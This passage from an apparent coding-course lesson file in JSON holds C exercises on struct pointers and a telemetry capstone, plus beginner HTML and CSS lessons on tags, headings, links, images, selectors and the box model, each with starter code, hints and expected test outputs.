149"}],"usesInput":true,"hasHarness":false},{"id":"struct-pointers","number":"5.3","title":"Struct Pointers & The Arrow: Directing the Fleet","content":"## Bridge Command on the USS Enterprise\n\nOn the bridge of the Starship *Enterprise*, Captain Picard does not duplicate and transport the entire 500-meter starship into his ready room whenever he orders a shield adjustment. He transmits a command signal directly to the ship's existing systems.\n\nIn C, structs often contain dozens of fields, strings, and buffers, taking up hundreds or thousands of bytes. If you pass a struct into a function by value, C has to duplicate every single byte onto the stack frame.\n\nInstead, professional C systems pass a **struct pointer** (costing only 8 bytes!).\n\n## The Arrow Operator (->)\n\nWhen you hold a pointer to a struct:\n~~~\nstruct Starship enterprise;\nstruct Starship *ship = &enterprise;\n~~~\n\nTo access a field through the pointer, you *could* write:\n~~~\n(*ship).shield = 100; // Dereference, then access field\n~~~\nBecause that syntax is awkward and the parentheses are mandatory (due to operator precedence), C provides the **arrow operator** (^->^):\n\n~~~\nship->shield = 100; // Exactly identical to (*ship).shield!\n~~~\n\nThe arrow operator is clean, elegant, and the universal signature of systems code in C.\n\n## Predict & Observe\n\nWhat happens if you write ^ship.shield^ when ^ship^ is a pointer?\nThe compiler stops with a syntax error: *member reference type 'struct Starship *' is a pointer; did you mean '->'?* Modern C compilers will even politely suggest the arrow for you.\n\n## Your Task\n\nDefine the struct:\n~~~\nstruct Starship {\n    char designation[30];\n    int shield;\n    int warp_core;\n};\n~~~\n\nImplement two functions that operate on struct pointers:\n1. ^void upgrade_shields(struct Starship *ship, int amount);^\n   Adds ^amount^ to ^ship->shield^.\n2. ^void engage_warp(struct Starship *ship, int burn);^\n   Subtracts ^burn^ from ^ship->warp_core^ (clamp to ^0^ if it drops below 0).\n\nIn ^main^:\n1. Read from stdin: ^designation shield warp_core upgrade_amt warp_burn^.\n2. Print initial status:\n   ^Vessel: <designation> | Shield: <shield>% | Warp Core: <warp_core>%^\n3. Call ^upgrade_shields(&ship, upgrade_amt);^\n4. Call ^engage_warp(&ship, warp_burn);^\n5. Print updated status:\n   ^Updated: <designation> | Shield: <shield>% | Warp Core: <warp_core>%^","starter":"#include <stdio.h>\n\n// TODO: Define struct Starship with designation[30], shield, warp_core\n// TODO: Prototypes for upgrade_shields and engage_warp\n\nint main(void) {\n    // TODO:\n    // Declare struct Starship ship;\n    // Read stats and adjustments from stdin\n    // Print initial Vessel status\n    // Call upgrade_shields and engage_warp with &ship\n    // Print Updated status\n\n    return 0;\n}\n\n// TODO: Implement upgrade_shields and engage_warp using the -> operator\n","hint":"In upgrade_shields and engage_warp, use the -> operator on ship (e.g. ship->shield += amount).","terms":[{"term":"arrow operator (->)","def":"Syntactic sugar in C for dereferencing a struct pointer and accessing a member: ptr->member."},{"term":"struct pointer","def":"A pointer storing the starting memory address of a struct instance."},{"term":"pass-by-pointer","def":"Passing the address of a struct to avoid expensive memory copying on the stack."}],"image":{"url":"/diagrams/c/struct-pointers.svg","caption":"Using struct pointers and the arrow operator (->) for memory-efficient in-place modification."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"USS Enterprise Shield Upgrade and Warp Burn","input":"Enterprise 75 90 25 30","expected":"Vessel: Enterprise | Shield: 75% | Warp Core: 90%\nUpdated: Enterprise | Shield: 100% | Warp Core: 60%"},{"name":"Voyager Full Warp Exhaustion","input":"Voyager 50 40 30 50","expected":"Vessel: Voyager | Shield: 50% | Warp Core: 40%\nUpdated: Voyager | Shield: 80% | Warp Core: 0%"}],"usesInput":true,"hasHarness":false},{"id":"unit-5-test","number":"5.4","title":"Unit 5 Capstone Test: Spacecraft Flight Computer & Telemetry System","content":"## Mission Briefing: Apollo Guidance Computer (AGC)\n\nIn July 1969, the Apollo 11 Lunar Module *Eagle* touched down on the Moon powered by the Apollo Guidance Computer—an embedded systems marvel that inspired generations of C systems programmers.\n\nAs your final capstone challenge in this course, you will build the core telemetry calibration engine for a modern deep-space probe (think *Interstellar* meets *Apollo 11*).\n\nYou will synthesize every pillar of the C programming language:\n- Header files, standard I/O, format specifiers.\n- Struct blueprints and composite data records.\n- Pointers, memory addresses, and the arrow operator (^->^).\n- Conditionals, threshold checking, and modular functions.\n\n## Technical Specifications\n\n1. Define the telemetry struct:\n~~~\nstruct TelemetryPacket {\n    char mission_code[16];\n    int altitude_km;\n    int velocity_kms;\n    int fuel_percent;\n    int status_code; // 1 = Nominal, 2 = Warning, 3 = Critical\n};\n~~~\n\n2. Implement the calibration function:\n^void calibrate_telemetry(struct TelemetryPacket *p, int altitude_drift, int burn_pct);^\n- Adjust altitude: ^p->altitude_km += altitude_drift;^\n- Burn fuel: ^p->fuel_percent -= burn_pct;^ (If ^p->fuel_percent < 0^, clamp to ^0^).\n- Evaluate flight status based on remaining fuel:\n  - If ^p->fuel_percent <= 15^: set ^p->status_code = 3;^\n  - Else if ^p->fuel_percent <= 40^: set ^p->status_code = 2;^\n  - Else: set ^p->status_code = 1;^\n\n3. Implement the reporting function:\n^void print_telemetry_dossier(const struct TelemetryPacket *p);^\nPrints the mission log:\n~~~\n--- FLIGHT TELEMETRY LOG ---\nMission: <mission_code>\nAltitude: <altitude_km> km\nVelocity: <velocity_kms> km/s\nFuel: <fuel_percent>%\nStatus: <status_string>\n~~~\n\nStatus String Mapping:\n- Code ^1^ &rarr; ^NOMINAL^\n- Code ^2^ &rarr; ^WARNING: LOW FUEL^\n- Code ^3^ &rarr; ^CRITICAL: ABORT MISSION^\n\n## Main Program\n\nInside ^main^:\n1. Declare an instance: ^struct TelemetryPacket packet;^\n2. Read from stdin:\n   ^mission_code altitude_km velocity_kms fuel_percent altitude_drift burn_pct^\n3. Call ^calibrate_telemetry(&packet, altitude_drift, burn_pct);^\n4. Call ^print_telemetry_dossier(&packet);^\n\n## Example\n\nInput:\n~~~\nApollo-11 384000 11 95 400 10\n~~~\n\nOutput:\n~~~\n--- FLIGHT TELEMETRY LOG ---\nMission: Apollo-11\nAltitude: 384400 km\nVelocity: 11 km/s\nFuel: 85%\nStatus: NOMINAL\n~~~","starter":"#include <stdio.h>\n\n// TODO: Define struct TelemetryPacket\n// TODO: Prototypes for calibrate_telemetry and print_telemetry_dossier\n\nint main(void) {\n    // TODO:\n    // Declare struct TelemetryPacket packet\n    // Read mission_code, altitude, velocity, fuel, altitude_drift, burn_pct\n    // Call calibrate_telemetry(&packet, altitude_drift, burn_pct)\n    // Call print_telemetry_dossier(&packet)\n\n    return 0;\n}\n\n// TODO: Implement calibrate_telemetry and print_telemetry_dossier\n","hint":"In calibrate_telemetry use p->fuel_percent -= burn_pct, then assign p->status_code based on the threshold (<=15 is 3, <=40 is 2, else 1).","terms":[{"term":"capstone","def":"A culminating project that integrates and applies concepts from across the entire curriculum."},{"term":"telemetry packet","def":"A structured data payload containing sensor measurements transmitted from a remote craft."},{"term":"const struct pointer","def":"A pointer parameter (const struct TelemetryPacket *p) signaling that the function will read but not mutate the struct."},{"term":"systems engineering","def":"Designing robust, hardware-level software that runs continuously with predictable behavior."}],"image":{"url":"/diagrams/c/unit-5-test.svg","caption":"The Apollo Guidance Computer (AGC) telemetry architecture: composite structs, pointer calibrations, and status diagnostics."},"isUnitTest":true,"fileName":"main.c","tests":[{"name":"Lunar Insertion Burn (Nominal)","input":"Apollo-11 384000 11 95 400 10","expected":"--- FLIGHT TELEMETRY LOG ---\nMission: Apollo-11\nAltitude: 384400 km\nVelocity: 11 km/s\nFuel: 85%\nStatus: NOMINAL"},{"name":"Orbital Deceleration (Warning Low Fuel)","input":"Endurance 52000 24 50 1500 25","expected":"--- FLIGHT TELEMETRY LOG ---\nMission: Endurance\nAltitude: 53500 km\nVelocity: 24 km/s\nFuel: 25%\nStatus: WARNING: LOW FUEL"},{"name":"Emergency Surface Evasion (Critical Abort)","input":"Voyager-2 90000 35 20 -500 10","expected":"--- FLIGHT TELEMETRY LOG ---\nMission: Voyager-2\nAltitude: 89500 km\nVelocity: 35 km/s\nFuel: 10%\nStatus: CRITICAL: ABORT MISSION"}],"usesInput":true,"hasHarness":false}]}]},{"id":"web","title":"Web Development (HTML, CSS & JS)","language":"JavaScript","languageId":"web","description":"Build the modern web from scratch: semantic HTML, modern CSS styling and Flexbox, JavaScript logic, and dynamic DOM interactivity.","units":[{"id":"html5-structure","title":"HTML5 - Structure & Semantic Markup","lessons":[{"id":"html-tags","number":"1.1","title":"Anatomy of an HTML Tag","content":"## The LEGO Bricks of the Web\n\nImagine building a movie studio soundstage. You do not just throw cameras and costumes into an empty field — you need a structural blueprint. In web development, **HTML (HyperText Markup Language)** is that structural blueprint.\n\nEvery single webpage you have ever visited, from YouTube to Spotify, is built from interlocking components called **elements**. Think of elements like LEGO bricks. To create a brick, you wrap your content in an **opening tag** like ^<h1>^ and snap it shut with a **closing tag** like ^</h1>^. The forward slash ^/^ is the crucial signal that tells the browser: \"this brick ends here!\"\n\nInside the opening tag, you can also attach **attributes** — extra information or superpowers, like ^class=\"hero\"^ or ^id=\"main-stage\"^.\n\n~~~\n<h1 class=\"hero\">Avengers Assemble</h1>\n~~~\n\n- ^<h1 class=\"hero\">^ - The **opening tag**. It names the element (^h1^ for headline) and defines an **attribute** (^class=\"hero\"^).\n- ^Avengers Assemble^ - The **content**. The actual text or nested elements living inside the brick.\n- ^</h1>^ - The **closing tag**. The forward slash ^/^ cleanly finishes the element.\n\n## The HTML5 Page Skeleton\n\nEvery complete HTML5 document follows a sacred four-part skeleton:\n\n1. ^<!DOCTYPE html>^ - The modern HTML5 declaration telling the browser to render standard modern code.\n2. ^<html>...</html>^ - The root container wrapping every element on the entire page.\n3. ^<head>...</head>^ - The behind-the-scenes control room holding page metadata, like the browser tab ^<title>^.\n4. ^<body>...</body>^ - The main stage holding everything visible to the user: headlines, paragraphs, images, and buttons.\n\n~~~\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Marvel Studios Official</title>\n  </head>\n  <body>\n    <h1>Avengers Headquarters</h1>\n    <p>Earth's Mightiest Heroes assemble here.</p>\n  </body>\n</html>\n~~~\n\n## Predict & Observe\n\nWhat would happen if you forgot the closing tag ^</h1>^? The browser would treat every paragraph and button underneath as part of the giant headline, throwing the whole stage into chaos! Tags must always be paired or properly closed.\n\n## Your Task\n\nConstruct and print the complete HTML5 document blueprint for Marvel Studios' official headquarters using a JavaScript template string.\n\nYour output must match exactly:\n\n~~~\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Marvel Studios Official</title>\n  </head>\n  <body>\n    <h1>Avengers Headquarters</h1>\n    <p>Earth's Mightiest Heroes assemble here.</p>\n  </body>\n</html>\n~~~","starter":"// Build the Marvel Studios HTML5 blueprint\nfunction buildStudioBlueprint() {\n  // Fill in the complete HTML5 document structure below\n  const html = `<!DOCTYPE html>\n<html>\n  <head>\n    <title>TODO</title>\n  </head>\n  <body>\n    <!-- Add h1 and p elements here -->\n  </body>\n</html>`;\n  return html;\n}\n\nconsole.log(buildStudioBlueprint());\n","hint":"Include <!DOCTYPE html>, <html>, <head> with <title>Marvel Studios Official</title>, and <body> with <h1>Avengers Headquarters</h1> and the paragraph.","terms":[{"term":"HTML","def":"HyperText Markup Language, the standard code for structuring web pages."},{"term":"element","def":"A complete building block consisting of an opening tag, content, and a closing tag."},{"term":"tag","def":"Keywords enclosed in angle brackets like ^<h1>^ that instruct browsers how to render content."},{"term":"attribute","def":"Extra configuration added to an opening tag, written as ^name=\"value\"^."},{"term":"DOCTYPE","def":"The declaration ^<!DOCTYPE html>^ telling browsers to interpret the page as modern HTML5."},{"term":"head","def":"The container for page metadata and the browser tab title that is not directly shown on the page."},{"term":"body","def":"The container for all visible content displayed to the user on the webpage."}],"image":{"url":"/diagrams/web/html-tags.svg","caption":"Anatomy of an HTML element: opening tag, attribute, inner content, and closing tag."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Generates valid HTML5 studio blueprint","input":"","expected":"<!DOCTYPE html>\n<html>\n  <head>\n    <title>Marvel Studios Official</title>\n  </head>\n  <body>\n    <h1>Avengers Headquarters</h1>\n    <p>Earth's Mightiest Heroes assemble here.</p>\n  </body>\n</html>"}],"usesInput":false,"hasHarness":false},{"id":"headings-paragraphs","number":"1.2","title":"Headings & Paragraph Hierarchy","content":"## The Newspaper Headline vs Spotify Tracklist\n\nWhen you pick up a newspaper or browse a Taylor Swift album on Spotify, your eyes do not read every word at equal size. You see one massive, unmissable headline at the top, followed by subheadings, followed by readable paragraphs of lyrics or liner notes.\n\nHTML models this hierarchy using **semantic headings**:\n- ^<h1>^ - The single primary headline for the entire page (like the album title *1989 (Taylor's Version)*). A good webpage almost always has only one ^<h1>^!\n- ^<h2>^ - Major section titles (like \"Album Overview\" or \"Disc 1\").\n- ^<h3>^ through ^<h6>^ - Progressively smaller sub-headings for fine-grained sections.\n- ^<p>^ - Standard **paragraphs** for body copy, descriptions, and story text.\n\n~~~\n<h1>1989 (Taylor's Version)</h1>\n<h2>Album Overview</h2>\n<p>The definitive <strong>pop reinvention</strong> that defined a generation.</p>\n<h3>Track Spotlight</h3>\n<p>Featuring <em>Style</em> and <em>Blank Space</em> with brand new vault recordings.</p>\n~~~\n\n## Meaning Over Looks: Semantic Formatting\n\nDo not use bold or italics just to look pretty — use them to communicate true meaning:\n- ^<strong>^ - Signifies strong importance or seriousness. Screen readers will read this text with vocal gravity!\n- ^<em>^ - Signifies conversational stress or a shift in tone (emphasis), rendered in italics.\n\n## Predict & Observe\n\nWhat is the danger of skipping from ^<h1>^ directly to ^<h4>^? Search engines and screen reader software for blind users rely on heading levels to build an outline of the page. Skipping levels breaks the document outline, making your page confusing to navigate.\n\n## Your Task\n\nGenerate the semantic album review snippet for *1989 (Taylor's Version)* using proper ^<h1>^, ^<h2>^, ^<h3>^, ^<p>^, ^<strong>^, and ^<em>^ tags.\n\nExpected output:\n\n~~~\n<h1>1989 (Taylor's Version)</h1>\n<h2>Album Overview</h2>\n<p>The definitive <strong>pop reinvention</strong> that defined a generation.</p>\n<h3>Track Spotlight</h3>\n<p>Featuring <em>Style</em> and <em>Blank Space</em> with brand new vault recordings.</p>\n~~~","starter":"// Generate semantic album review snippet\nfunction formatAlbumReview() {\n  // Fix the broken heading levels and add missing strong and em formatting\n  return `<h1>1989 (Taylor's Version)</h1>\n<h4>Album Overview</h4>\n<p>The definitive pop reinvention that defined a generation.</p>\n<h6>Track Spotlight</h6>\n<p>Featuring Style and Blank Space with brand new vault recordings.</p>`;\n}\n\nconsole.log(formatAlbumReview());\n","hint":"Use <h2> for Album Overview, <h3> for Track Spotlight, <strong> around pop reinvention, and <em> around Style and Blank Space.","terms":[{"term":"heading","def":"Structural titles ranging from ^<h1>^ (most important) to ^<h6>^ (least important)."},{"term":"paragraph","def":"The ^<p>^ tag used to group sentences into standard readable text blocks."},{"term":"semantic HTML","def":"Choosing HTML tags based on what the content means rather than how it looks."},{"term":"strong","def":"An element denoting strong importance or urgency; typically displayed in bold."},{"term":"em","def":"An element denoting spoken emphasis that changes the meaning of a sentence; rendered in italics."}],"image":{"url":"/diagrams/web/headings-paragraphs.svg","caption":"Visual scale comparing h1 through h6 semantic headings, paragraphs, strong, and em."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Outputs semantic album review with proper hierarchy","input":"","expected":"<h1>1989 (Taylor's Version)</h1>\n<h2>Album Overview</h2>\n<p>The definitive <strong>pop reinvention</strong> that defined a generation.</p>\n<h3>Track Spotlight</h3>\n<p>Featuring <em>Style</em> and <em>Blank Space</em> with brand new vault recordings.</p>"}],"usesInput":false,"hasHarness":false},{"id":"links-images","number":"1.3","title":"Hyperlinks & Accessible Images","content":"## The Multiverse Portals of the Internet\n\nWithout links, the web would be a bunch of isolated islands. The **anchor tag** ^<a>^ is the multiverse portal of the Internet: click on it, and it teleports the browser to an entirely new address across the globe!\n\nThe destination URL is passed in the **^href^** attribute (short for Hypertext REFerence):\n\n~~~\n<a href=\"https://dailybugle.com\">Visit Daily Bugle</a>\n~~~\n\n## Embedding Visuals with Accessible Images\n\nTo show images, we use the **^<img>^** element. Notice something unique: ^<img>^ is a **void element** (it has no closing tag like ^</img>^). Instead, it carries two essential attributes:\n1. **^src^** (Source): The URL or file path to the image asset.\n2. **^alt^** (Alternative text): A concise, descriptive plain-English explanation of what the image shows.\n\n~~~\n<img src=\"https://dailybugle.com/spidey.jpg\" alt=\"Spider-Man swinging between Manhattan skyscrapers\" />\n~~~\n\n## Why Alt Text Matters\n\nAlt text is not optional. If the user is visually impaired and using a screen reader, the software reads your ^alt^ text aloud. If the user has a slow mobile connection and the image fails to download, the browser renders the ^alt^ text in its place. Great developers always write clear, descriptive alt text!\n\n## Your Task\n\nConstruct an article card for a Daily Bugle scoop on Spider-Man. The card must wrap in an ^<article>^ container, featuring an ^<h2>^ headline, an accessible ^<img>^, a descriptive ^<p>^, and an ^<a>^ hyperlink.\n\nExpected output:\n\n~~~\n<article>\n  <h2>Spider-Man Spotted Over Queens!</h2>\n  <img src=\"https://dailybugle.com/spidey.jpg\" alt=\"Spider-Man swinging between Manhattan skyscrapers\" />\n  <p>Peter Parker captured exclusive photos of the web-slinger in action.</p>\n  <a href=\"https://dailybugle.com/full-story\">Read full Daily Bugle scoop</a>\n</article>\n~~~","starter":"// Generate Spider-Man Daily Bugle article card\nfunction createDailyBugleArticle() {\n  // Fix the missing alt text, incorrect attributes, and broken anchor tag\n  return `<article>\n  <h2>Spider-Man Spotted Over Queens!</h2>\n  <img src=\"https://dailybugle.com/spidey.jpg\" />\n  <p>Peter Parker captured exclusive photos of the web-slinger in action.</p>\n  <a url=\"https://dailybugle.com/full-story\">Read full Daily Bugle scoop</a>\n</article>`;\n}\n\nconsole.log(createDailyBugleArticle());\n","hint":"Add alt=\"Spider-Man swinging between Manhattan skyscrapers\" to the img tag, and change url= to href= on the anchor tag.","terms":[{"term":"anchor tag","def":"The ^<a>^ tag used to create clickable hyperlinks."},{"term":"href","def":"Hypertext REFerence; the destination URL attribute for a link."},{"term":"img tag","def":"A void tag used to embed visual graphics on a page."},{"term":"src","def":"Source; the file path or web URL of the image."},{"term":"alt text","def":"Descriptive alternative text for screen readers and failed image loads."},{"term":"void element","def":"An HTML tag that cannot hold child content and has no closing tag (like ^<img>^)."}],"image":{"url":"/diagrams/web/links-images.svg","caption":"Anchor links with href teleporting users, and img elements with src and accessible alt text."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Outputs article card with accessible image and link","input":"","expected":"<article>\n  <h2>Spider-Man Spotted Over Queens!</h2>\n  <img src=\"https://dailybugle.com/spidey.jpg\" alt=\"Spider-Man swinging between Manhattan skyscrapers\" />\n  <p>Peter Parker captured exclusive photos of the web-slinger in action.</p>\n  <a href=\"https://dailybugle.com/full-story\">Read full Daily Bugle scoop</a>\n</article>"}],"usesInput":false,"hasHarness":false},{"id":"unit-1-test","number":"1.4","title":"Unit 1 Test: Fan Club Profile Page","content":"## Unit 1 Capstone Challenge: Fan Club Profile Page\n\nCongratulations on reaching the end of Unit 1! You have learned the grammar of HTML: tags, attributes, document scaffolding, semantic hierarchies, images, and links.\n\nNow put it all together to build the official portal for the **Avengers Fan Club**.\n\n## Specifications\n\nYour function must generate a complete, valid HTML5 document containing:\n\n1. Modern ^<!DOCTYPE html>^ declaration.\n2. Root ^<html>^ with child ^<head>^ and ^<body>^.\n3. Inside ^<head>^: a ^<title>^ containing ^Avengers Official Fan Club^.\n4. Inside ^<body>^:\n   - An ^<h1>^ containing ^Avengers Fan Club^\n   - A ^<p>^ containing ^Welcome to the <strong>official headquarters</strong> for Earth's mightiest supporters, founded in <em>New York City</em>.^\n   - An ^<h2>^ containing ^Featured Roster^\n   - An unordered list ^<ul>^ containing three list items (^<li>^):\n     - ^Iron Man - Genius Inventor^\n     - ^Captain America - First Avenger^\n     - ^Thor - God of Thunder^\n   - An accessible ^<img>^ with ^src=\"/images/avengers-badge.png\"^ and ^alt=\"Avengers golden crest shield emblem\"^\n   - An anchor ^<a>^ with ^href=\"https://avengers.org/join\"^ and text ^Join the Initiative Today^\n\nExpected output:\n\n~~~\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Avengers Official Fan Club</title>\n  </head>\n  <body>\n    <h1>Avengers Fan Club</h1>\n    <p>Welcome to the <strong>official headquarters</strong> for Earth's mightiest supporters, founded in <em>New York City</em>.</p>\n    <h2>Featured Roster</h2>\n    <ul>\n      <li>Iron Man - Genius Inventor</li>\n      <li>Captain America - First Avenger</li>\n      <li>Thor - God of Thunder</li>\n    </ul>\n    <img src=\"/images/avengers-badge.png\" alt=\"Avengers golden crest shield emblem\" />\n    <a href=\"https://avengers.org/join\">Join the Initiative Today</a>\n  </body>\n</html>\n~~~","starter":"// Unit 1 Test: Avengers Fan Club Profile Page\nfunction generateFanClubPage() {\n  // Replace this placeholder with the full HTML5 page markup\n  return `<div>Work in progress...</div>`;\n}\n\nconsole.log(generateFanClubPage());\n","hint":"Include <!DOCTYPE html>, <html>, <head> with <title>, <body> with <h1>, <p> using <strong> and <em>, <h2>, <ul> with 3 <li> items, <img> with src and alt, and <a> with href.","terms":[{"term":"unit test","def":"A cumulative coding challenge assessing all core skills covered in a unit."},{"term":"unordered list","def":"The ^<ul>^ tag used to create bulleted collections of list items."},{"term":"list item","def":"The ^<li>^ tag representing an individual item inside a ^<ul>^ or ^<ol>^ list."}],"image":{"url":"/diagrams/web/unit-1-test.svg","caption":"Full fan club profile layout: DOCTYPE, head title, semantic headings, strong/em text, image, and unordered list."},"isUnitTest":true,"fileName":"index.js","tests":[{"name":"Generates full Avengers fan club profile page","input":"","expected":"<!DOCTYPE html>\n<html>\n  <head>\n    <title>Avengers Official Fan Club</title>\n  </head>\n  <body>\n    <h1>Avengers Fan Club</h1>\n    <p>Welcome to the <strong>official headquarters</strong> for Earth's mightiest supporters, founded in <em>New York City</em>.</p>\n    <h2>Featured Roster</h2>\n    <ul>\n      <li>Iron Man - Genius Inventor</li>\n      <li>Captain America - First Avenger</li>\n      <li>Thor - God of Thunder</li>\n    </ul>\n    <img src=\"/images/avengers-badge.png\" alt=\"Avengers golden crest shield emblem\" />\n    <a href=\"https://avengers.org/join\">Join the Initiative Today</a>\n  </body>\n</html>"}],"usesInput":false,"hasHarness":false}]},{"id":"css3-styling","title":"CSS3 - Styling, Colors & The Box Model","lessons":[{"id":"css-selectors","number":"2.1","title":"CSS Selectors & Colors","content":"## The Wardrobe Stylist of the Web\n\nIf HTML is the plain mannequin standing in a storefront window, **CSS (Cascading Style Sheets)** is the superstar stylist who dresses it in neon sunglasses, leather jackets, and custom kicks.\n\nA CSS rule has two main pieces:\n1. **Selector**: Declares *which* HTML elements to dress.\n2. **Declaration Block**: Sits inside curly braces ^{ ... }^ and lists property-value pairs ending with semicolons.\n\n~~~\nselector {\n  property: value;\n}\n~~~\n\n## The Three Core Selectors\n\n1. **Element Selector** (e.g. ^body^ or ^p^): Targets every single element of that tag name across the whole document.\n2. **Class Selector** (prefixed with a period ^.^, e.g. ^.stage-light^): Targets any element decorated with that class. You can apply the same class to dozens of items!\n3. **ID Selector** (prefixed with a hashtag ^#^, e.g. ^#dj-booth^): Targets one unique element with that exact ID.\n\n## Expressing Color: Hex Codes & Fonts\n\nComputers mix light from Red, Green, and Blue. Hexadecimal color codes like ^#0b0c10^ and ^#66fcf1^ allow you to choose from over 16 million vivid shades.\n\n~~~\nbody {\n  background-color: #0b0c10;\n  color: #c5c6c7;\n  font-family: sans-serif;\n}\n.stage-light {\n  color: #66fcf1;\n  font-size: 20px;\n}\n#dj-booth {\n  background-color: #1f2833;\n  color: #45a29e;\n}\n~~~\n\n## Predict & Observe\n\nWhat happens if an element matches both a class selector and an ID selector? The ID selector has higher **specificity**, meaning its styles win in any direct conflict!\n\n## Your Task\n\nConstruct and log the CSS rules for a Cyberpunk DJ Stage stylesheet containing rules for ^body^, ^.stage-light^, and ^#dj-booth^.\n\nExpected output:\n\n~~~\nbody {\n  background-color: #0b0c10;\n  color: #c5c6c7;\n  font-family: sans-serif;\n}\n.stage-light {\n  color: #66fcf1;\n  font-size: 20px;\n}\n#dj-booth {\n  background-color: #1f2833;\n  color: #45a29e;\n}\n~~~","starter":"// Build Cyberpunk DJ Stage CSS Stylesheet\nfunction generateStageStyles() {\n  // Fix the missing periods, hashtags, and CSS properties\n  return `body {\n  background-color: #0b0c10;\n  color: #c5c6c7;\n  font-family: sans-serif;\n}\nstage-light {\n  color: #66fcf1;\n  font-size: 20px;\n}\ndj-booth {\n  background-color: #1f2833;\n  color: #45a29e;\n}`;\n}\n\nconsole.log(generateStageStyles());\n","hint":"Remember that class selectors must begin with a dot (.) and ID selectors must begin with a hash (#).","terms":[{"term":"CSS","def":"Cascading Style Sheets, used to style the visual presentation and layout of HTML."},{"term":"selector","def":"The pattern in a CSS rule pointing to which HTML elements should receive styling."},{"term":"class selector","def":"A selector starting with a period (.) that styles all elements bearing that class attribute."},{"term":"id selector","def":"A selector starting with a hash (#) that targets one single element with that unique ID."},{"term":"hex color","def":"A 6-character hexadecimal color notation representing RGB channels (e.g. #66fcf1)."},{"term":"property","def":"A specific visual attribute being styled, such as color, font-size, or background-color."}],"image":{"url":"/diagrams/web/css-selectors.svg","caption":"Targeting styles using element selectors, class selectors (.), and ID selectors (#)."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Generates valid CSS stylesheet with element, class, and ID rules","input":"","expected":"body {\n  background-color: #0b0c10;\n  color: #c5c6c7;\n  font-family: sans-serif;\n}\n.stage-light {\n  color: #66fcf1;\n  font-size: 20px;\n}\n#dj-booth {\n  background-color: #1f2833;\n  color: #45a29e;\n}"}],"usesInput":false,"hasHarness":false},{"id":"box-model","number":"2.2","title":"The CSS Box Model","content":"## The Cardboard Delivery & Picture Frame Analogy\n\nHere is the secret of the web: to a browser, every single element on the screen is a rectangular cardboard package. This fundamental concept is known as the **CSS Box Model**.\n\nA box consists of 4 concentric layers, working from the inside out:\n\n1. **Content**: The inner treasure (text, icon, or image). Defined by ^width^ and ^height^.\n2. **Padding**: The protective bubble wrap inside the box between the content and the cardboard shell.\n3. **Border**: The cardboard shell or picture frame itself. Defined by thickness, style, and color (^2px solid #f59e0b^).\n4. **Margin**: The personal bubble space outside the box keeping neighbor boxes from bumping into it.\n\n## Calculating Real Dimensions\n\nWhen calculating how much horizontal space a box occupies on a shelf:\nTotal Width = ^width + (left/right padding) + (left/right border) + (left/right margin)^\n\nFor example, a vinyl sleeve with:\n- Content width = 300px\n- Padding = 20px on both sides (40px total)\n- Border = 5px on both sides (10px total)\n- Margin = 15px on both sides (30px total)\nTotal space occupied = 300 + 40 + 10 + 30 = **380px**!\n\nSetting ^box-sizing: border-box;^ is best practice in modern web development because it locks the total width to include padding and border automatically.\n\n## Your Task\n\nWrite a script that computes the total occupied width for a vinyl album sleeve and prints the calculated width followed by the CSS rule block for ^.vinyl-sleeve^.\n\nExpected output:\n\n~~~\nTotal Occupied Width: 380px\n.vinyl-sleeve {\n  box-sizing: border-box;\n  width: 300px;\n  padding: 20px;\n  border: 5px solid #f59e0b;\n  margin: 15px;\n}\n~~~","starter":"// Box Model Calculator for Vinyl Album Sleeve\nfunction buildBoxModel() {\n  const contentWidth = 300;\n  const padding = 20;\n  const border = 5;\n  const margin = 15;\n\n  // Compute total occupied horizontal width: content + padding*2 + border*2 + margin*2\n  const totalOccupiedWidth = 0; // Fix this formula!\n\n  const css = `.vinyl-sleeve {\n  box-sizing: border-box;\n  width: ${contentWidth}px;\n  padding: ${padding}px;\n  border: ${border}px solid #f59e0b;\n  margin: ${margin}px;\n}`;\n\n  return `Total Occupied Width: ${totalOccupiedWidth}px\\n${css}`;\n}\n\nconsole.log(buildBoxModel());\n","hint":"Total width = contentWidth + (padding * 2) + (border * 2) + (margin * 2).","terms":[{"term":"box model","def":"The core CSS layout model where elements are rendered as boxes with content, padding, border, and margin."},{"term":"content","def":"The innermost area where text, images, or child elements appear."},{"term":"padding","def":"The inner clear space between the content and the element border."},{"term":"border","def":"The outer edge or frame wrapping around padding and content."},{"term":"margin","def":"The outer buffer space separating the element from neighboring elements."},{"term":"box-sizing","def":"A CSS property controlling whether width and height include padding and borders (^border-box^)."}],"image":{"url":"/diagrams/web/box-model.svg","caption":"The 4 concentric layers: content, padding, border, and margin."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Calculates total occupied width and outputs box model CSS","input":"","expected":"Total Occupied Width: 380px\n.vinyl-sleeve {\n  box-sizing: border-box;\n  width: 300px;\n  padding: 20px;\n  border: 5px solid #f59e0b;\n  margin: 15px;\n}"}],"usesInput":false,"hasHarness":false},{"id":"flexbox-basics","number":"2.3","title":"Flexbox Layout Basics","content":"## The Netflix Carousel & Superhero Lineup\n\nIn the early days of the web, arranging boxes side-by-side required tricky math and brittle hacks. Then came **Flexbox (Flexible Box Layout)** — the greatest layout superpower in CSS history.\n\nFlexbox turns any container into a smart magnetic director. You declare ^display: flex;^ on the parent container, and all child items instantly snap into a responsive row!\n\n## The Two Axes: Main Axis vs Cross Axis\n\nFlexbox operates along two perpendicular axes:\n\n1. **Main Axis** (Horizontal by default when ^flex-direction: row^):\n   Controlled by **^justify-content^**:\n   - ^flex-start^: Items pack to the left\n   - ^center^: Items center together\n   - ^space-between^: First item at the start, last at the end, equal space in between!\n2. **Cross Axis** (Vertical by default):\n   Controlled by **^align-items^**:\n   - ^center^: Centers items vertically\n   - ^stretch^: Stretches items to fill the container height\n\n~~~\n.movie-row {\n  display: flex;\n  flex-direction: row;\n  justify-content: space-between;\n  align-items: center;\n  gap: 16px;\n}\n~~~\n\nThe **^gap^** property provides effortless gutter spacing between items without needing messy margins.\n\n## Your Task\n\nConstruct and print the CSS rules for a Netflix-style movie carousel:\n- ^.movie-row^: flex container arranged in a row, spaced evenly with ^space-between^, aligned centrally with ^center^, and a ^16px^ gap.\n- ^.movie-card^: nested flex container 